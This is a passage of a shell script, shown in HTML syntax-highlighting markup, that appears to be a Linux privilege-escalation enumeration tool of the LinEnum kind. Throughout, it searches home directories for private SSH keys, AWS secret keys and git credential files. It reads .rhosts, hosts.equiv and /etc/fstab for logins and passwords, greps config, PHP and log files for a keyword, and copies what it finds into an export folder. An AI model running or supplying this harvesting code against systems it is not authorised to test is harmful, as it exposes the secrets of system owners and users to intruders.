class="token punctuation">[</span> <span class="token string">"<span class="token variable">$writablematchedfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>                    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] User/Group writable files with the same capabilities associated with the current user:\e[00m\n<span class="token variable">$writablematchedfiles</span>"</span>                    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>                <span class="token keyword">fi</span>            <span class="token keyword">fi</span>        <span class="token keyword">fi</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#look for private keys - thanks djhohnstein</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>privatekeyfiles<span class="token operator">=</span>`grep -rl <span class="token string">"PRIVATE KEY-----"</span> /home 2<span class="token operator">></span>/dev/null`    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$privatekeyfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Private SSH keys found!:\e[00m\n<span class="token variable">$privatekeyfiles</span>"</span>        <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#look for AWS keys - thanks djhohnstein</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>awskeyfiles<span class="token operator">=</span>`grep -rli <span class="token string">"aws_secret_access_key"</span> /home 2<span class="token operator">></span>/dev/null`    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$awskeyfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] AWS secret keys found!:\e[00m\n<span class="token variable">$awskeyfiles</span>"</span>        <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#look for git credential files - thanks djhohnstein</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>gitcredfiles<span class="token operator">=</span>`find / -name <span class="token string">".git-credentials"</span> 2<span class="token operator">></span>/dev/null`    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$gitcredfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Git credentials saved on the machine!:\e[00m\n<span class="token variable">$gitcredfiles</span>"</span>        <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#list all world-writable files excluding /proc and /sys</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>wwfiles<span class="token operator">=</span>`find / <span class="token operator">!</span> -path <span class="token string">"*/proc/*"</span> <span class="token operator">!</span> -path <span class="token string">"/sys/*"</span> -perm -2 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span>`    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wwfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] World-writable files (excluding /proc and /sys):\e[00m\n<span class="token variable">$wwfiles</span>"</span>         <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wwfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">mkdir</span> <span class="token variable">$format</span>/ww-files/ 2<span class="token operator">></span>/dev/null        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$wwfiles</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/ww-files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null    <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#are any .plan files accessible in /home (could contain useful information)</span>usrplan<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /home -iname *.plan -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$usrplan</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Plan file permissions and contents:\e[00m\n<span class="token variable">$usrplan</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$usrplan</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/plan_files/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$usrplan</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/plan_files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span>bsdusrplan<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /usr/home -iname *.plan -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$bsdusrplan</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Plan file permissions and contents:\e[00m\n<span class="token variable">$bsdusrplan</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$bsdusrplan</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/plan_files/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$bsdusrplan</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/plan_files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#are there any .rhosts files accessible - these may allow us to login as another user etc.</span>rhostsusr<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /home -iname *.rhosts -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rhostsusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n<span class="token variable">$rhostsusr</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rhostsusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/rhosts/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$rhostsusr</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/rhosts/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span>bsdrhostsusr<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /usr/home -iname *.rhosts -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$bsdrhostsusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n<span class="token variable">$bsdrhostsusr</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$bsdrhostsusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/rhosts 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$bsdrhostsusr</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/rhosts/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span>rhostssys<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /etc -iname hosts.equiv -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rhostssys</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Hosts.equiv file and contents: \e[00m\n<span class="token variable">$rhostssys</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rhostssys</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/rhosts/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$rhostssys</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/rhosts/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#list nfs shares/permisisons etc.</span>nfsexports<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /etc/exports 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">cat</span> /etc/exports 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$nfsexports</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] NFS config details: \e[00m\n<span class="token variable">$nfsexports</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$nfsexports</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/exports <span class="token variable">$format</span>/etc-export/exports 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token comment" spellcheck="true">#phackt</span>  <span class="token comment" spellcheck="true">#displaying /etc/fstab</span>  fstab<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/fstab 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fstab</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems\e[00m"</span>    <span class="token keyword">echo</span> -e <span class="token string">"<span class="token variable">$fstab</span>"</span>    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#looking for credentials in /etc/fstab</span>fstab<span class="token operator">=</span>`grep username /etc/fstab 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{sub(/.*\username=/,"");sub(/\,.*/,"")}1'</span> 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">xargs</span> -r <span class="token keyword">echo</span> username: 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">grep</span> password /etc/fstab 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{sub(/.*\password=/,"");sub(/\,.*/,"")}1'</span> 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">xargs</span> -r <span class="token keyword">echo</span> password: 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">grep</span> domain /etc/fstab 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{sub(/.*\domain=/,"");sub(/\,.*/,"")}1'</span> 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">xargs</span> -r <span class="token keyword">echo</span> domain: 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fstab</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Looks like there are credentials in /etc/fstab!\e[00m\n<span class="token variable">$fstab</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fstab</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-exports/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/fstab <span class="token variable">$format</span>/etc-exports/fstab <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span>fstabcred<span class="token operator">=</span>`grep cred /etc/fstab 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">xargs</span> -I<span class="token punctuation">{</span><span class="token punctuation">}</span> sh -c <span class="token string">'ls -la {}; cat {}'</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fstabcred</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] /etc/fstab contains a credentials file!\e[00m\n<span class="token variable">$fstabcred</span>"</span>     <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fstabcred</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-exports/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/fstab <span class="token variable">$format</span>/etc-exports/fstab <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"[-] Can't search *.conf files as no keyword was entered\n"</span>   <span class="token keyword">else</span>    confkey<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 4 -name *.conf -type f -exec <span class="token function">grep</span> -Hn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$confkey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n<span class="token variable">$confkey</span>"</span>       <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>      <span class="token keyword">else</span>     <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .conf files (recursive 4 levels):\e[00m"</span>     <span class="token keyword">echo</span> -e <span class="token string">"'<span class="token variable">$keyword</span>' not found in any .conf files"</span>     <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>     <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">:</span>  <span class="token keyword">else</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$confkey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      confkeyfile<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 4 -name *.conf -type f -exec <span class="token function">grep</span> -lHn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>      <span class="token function">mkdir</span> --parents <span class="token variable">$format</span>/keyword_file_matches/config_files/ 2<span class="token operator">></span>/dev/null      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$confkeyfile</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/keyword_file_matches/config_files/ <span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#use supplied keyword and cat *.php files for potential matches - output will show line number within relevant file path where a match has been located</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"[-] Can't search *.php files as no keyword was entered\n"</span>   <span class="token keyword">else</span>    phpkey<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 10 -name *.php -type f -exec <span class="token function">grep</span> -Hn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$phpkey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .php files (recursive 10 levels - output format filepath:identified line number where keyword appears):\e[00m\n<span class="token variable">$phpkey</span>"</span>       <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>      <span class="token keyword">else</span>   <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .php files (recursive 10 levels):\e[00m"</span>   <span class="token keyword">echo</span> -e <span class="token string">"'<span class="token variable">$keyword</span>' not found in any .php files"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>     <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">:</span>  <span class="token keyword">else</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$phpkey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    phpkeyfile<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 10 -name *.php -type f -exec <span class="token function">grep</span> -lHn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>      <span class="token function">mkdir</span> --parents <span class="token variable">$format</span>/keyword_file_matches/php_files/ 2<span class="token operator">></span>/dev/null      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$phpkeyfile</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/keyword_file_matches/php_files/ <span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"[-] Can't search *.log files as no keyword was entered\n"</span>   <span class="token keyword">else</span>    logkey<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 4 -name *.log -type f -exec <span class="token function">grep</span> -Hn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$logkey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .log files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n<span class="token variable">$logkey</span>"</span>       <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>      <span class="token keyword">else</span>     <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Find keyword (<span class="token variable">$keyword</span>) in .log files (recursive 4 levels):\e[00m"</span>     <span class="token keyword">echo</span> -e <span class="token string">"'<span class="token variable">$keyword</span>' not found in any .log files"</span>    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>     <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>  <span class="token keyword">:</span>  <span class="token keyword">else</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$logkey</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      logkeyfile<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -maxdepth 4 -name *.log -type f -exec <span class="token function">grep</span> -lHn $keyword <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>      <span class="token function">mkdir</span> --parents <span class="token variable">$format</span>/keyword_file_matches/log_files/ 2<span class="token operator">></span>/dev/null      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$logkeyfile</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/keyword_file_matches/log_files/ <span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$keyword</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>  <span class="token 